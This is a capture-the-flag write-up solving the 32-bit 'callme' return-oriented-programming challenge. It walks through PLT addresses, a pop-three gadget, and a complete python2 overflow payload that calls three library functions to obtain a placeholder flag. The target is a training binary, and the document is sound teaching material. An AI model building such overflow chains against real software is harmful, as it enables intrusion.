# callme32
According to the descrption, we need to call the functions callme_one, callme_two, callme_three with three arguments in specific order.

Hint also tells that we need to call the functions through plt(procedure linkage table).

Check the security:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, the we are able to use ret2function or rop.

Use ghidra to track the assembly code, and we will find that the program does not call functions callme_one, callme_two, callme_three. 

These functions are included from shared library, and their function address is stored in the plt table. We can find their function address in plt.
```
...
Breakpoint 3 at 0x80484f0 (callme_one@plt)
Breakpoint 4 at 0x80484e0 (callme_three@plt)
Breakpoint 5 at 0x8048550 (callme_two@plt)
...
```
We obtain three function address, before calling them we need to set the arguments properly.

Hint has told us that these functions need three parameters, which are 0xdeadbeef, 0xcafebabe, and 0xd00df00d.

x86 use stack to pass function arguments, therefore, we need to push three arguments into stack, then the function call will be:
```
0x80484f0 (callme_one@plt) + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
0x8048550 (callme_two@plt) + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
0x80484e0 (callme_three@plt) + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
```
However, if we use this format directly, we will get segmentation fault. 

This is because we do not pop the stack correctly. For a function call, we need to push and pop the function arguments by ourselves. Pattern upward we do not pop argumnents out the stack, then the next return address will be wrong.

Therefore, we need to pop the argument out for every function call:
```
0x80484f0 (callme_one@plt) + (pop arguments) + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
0x8048550 (callme_two@plt) + (pop arguments) + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
0x80484e0 (callme_three@plt) + (pop arguments) + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
```
We check three functions in libcallme32.so using ghidra, we find that function callme_one, callme_two, callme_three obtaining the argument by:
```
...
int               Stack[0x4]:4   param_1                                 XREF[1]:     00010768(R)  
int               Stack[0x8]:4   param_2                                 XREF[1]:     00010775(R)  
int               Stack[0xc]:4   param_3                                 XREF[1]:     00010782(R)  
...
```
This means that the function actually get the arguments from sp+4, sp+8, sp+12, where sp+0 we can use it to do pop operation.

We find the proper gadget using rop command in gdb-peda, since we have three arguments, we need a pop three-times gadget, or three one-time pop gadget.  
```
...
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
...
```
We find a proper gadget, then the payload will be:
```
0x80484f0 (callme_one@plt) + 0x080487f9  + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
0x8048550 (callme_two@plt) + 0x080487f9  + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
0x80484e0 (callme_three@plt) + 0x080487f9 + 0xdeadbeef + 0xcafebabe + 0xd00df00d 
```
Now, we can build whole payload.

First, same as problems before, the overflow buffer is 40 bytes, and rbp register is 4 bytes.
```
'A' * 40 + 'A' * 4
```
We jump to the function, and after function finished, jump to gadget address to pop the arguments. 
```
'\xf0\x84\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0' + '\x50\x85\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0' + '\xe0\x84\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0'
```
Finally, the whole payload will be:
```
python2 -c "print 'A'*44 + '\xf0\x84\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0' + '\x50\x85\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0' + '\xe0\x84\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0'" | ./callme32
```
We obtain the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
